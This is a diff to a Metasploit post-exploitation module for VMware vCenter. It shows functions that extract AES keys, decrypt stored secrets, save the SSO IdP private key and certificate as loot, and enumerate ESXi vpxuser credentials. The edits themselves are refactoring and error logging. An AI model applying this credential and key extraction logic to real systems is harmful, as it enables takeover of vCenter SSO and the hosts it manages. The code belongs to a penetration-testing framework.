@@ -394,7 +394,7 @@ class MetasploitModule < Msf::Post
   end
 
   def get_aes_keys_from_host
-    print_status('Extract tenant and vpx AES encryption key...')
+    print_status('Extracting tenant and vpx AES encryption key...')
 
     tenant_key = get_aes_keys(base_fqdn, vc_psc_fqdn, base_dn, bind_dn, shell_bind_pw)
     fail_with(Msf::Exploit::Failure::Unknown, 'Error extracting tenant and vpx AES encryption key') if tenant_key.nil?
@@ -458,24 +458,26 @@ class MetasploitModule < Msf::Post
     decipher.padding = 0
     decipher.key = vc_tenant_aes_key
     return (decipher.update(ciphertext) + decipher.final).delete("\000")
-  rescue StandardError
+  rescue StandardError => e
+    elog('Error performing tenant_aes_decrypt', error: e)
     fail_with(Msf::Exploit::Failure::Unknown, 'Error performing tenant_aes_decrypt')
   end
 
-  def update_keystore(public, private)
-    if public.is_a? String
-      cert = validate_x509_cert(public)
+  def update_keystore(public_key, private_key)
+    if public_key.is_a? String
+      cert = validate_x509_cert(public_key)
     else
-      cert = public
+      cert = public_key
     end
-    if private.is_a? String
-      key = validate_pkey(private)
+    if private_key.is_a? String
+      key = validate_pkey(private_key)
     else
-      key = private
+      key = private_key
     end
     cert_thumbprint = OpenSSL::Digest::SHA1.new(cert.to_der).to_s
     keystore[cert_thumbprint] = key
-  rescue StandardError
+  rescue StandardError => e
+    elog('Error updating module keystore', error: e)
     fail_with(Msf::Exploit::Failure::Unknown, 'Error updating module keystore')
   end
 
@@ -521,10 +523,10 @@ class MetasploitModule < Msf::Post
       return
     end
 
-    p = store_loot('idp', 'PEM', rhost, sts_key, 'SSO_STS_IDP.key', 'vCenter SSO IdP private key')
+    p = store_loot('idp', 'application/x-pem-file', rhost, sts_key, 'SSO_STS_IDP.key', 'vCenter SSO IdP private key')
     print_good("SSO_STS_IDP key: #{p}")
 
-    p = store_loot('idp', 'PEM', rhost, sts_cert, 'SSO_STS_IDP.pem', 'vCenter SSO IdP certificate')
+    p = store_loot('idp', 'application/x-pem-file', rhost, sts_cert, 'SSO_STS_IDP.pem', 'vCenter SSO IdP certificate')
     print_good("SSO_STS_IDP cert: #{p}")
 
     update_keystore(sts_cert, sts_key)
@@ -700,7 +702,7 @@ class MetasploitModule < Msf::Post
   def enum_vpx_user_creds
     vpxuser_rows = get_vpx_users(shell_vcdb_pass, vcdb_user, vcdb_name, vc_sym_key)
 
-    if vpxuser_rows.nil? || output.empty?
+    if vpxuser_rows.nil?
       print_warning('No ESXi hosts attached to this vCenter system')
       return
     end
@@ -761,7 +763,7 @@ class MetasploitModule < Msf::Post
 
     idm_cmd = cmd_exec("curl -f -s http://localhost:7080/idm/tenant/#{base_fqdn}/certificates?scope=TENANT")
 
-    unless idm_cmd != ''
+    if idm_cmd.blank?
       print_error('Unable to query IDM tenant information, cannot validate ssoserverSign certificate against IDM')
       return false
     end
@@ -814,7 +816,7 @@ class MetasploitModule < Msf::Post
     end
 
     vsphere_machine_ipv4 = get_ipv4
-    if vsphere_machine_ipv4.nil?
+    if vsphere_machine_ipv4.nil? || !Rex::Socket.is_ipv4?(vsphere_machine_ipv4)
       print_bad('Could not determine vCenter IPv4 address')
     else
       print_status("Appliance IPv4: #{vsphere_machine_ipv4}")
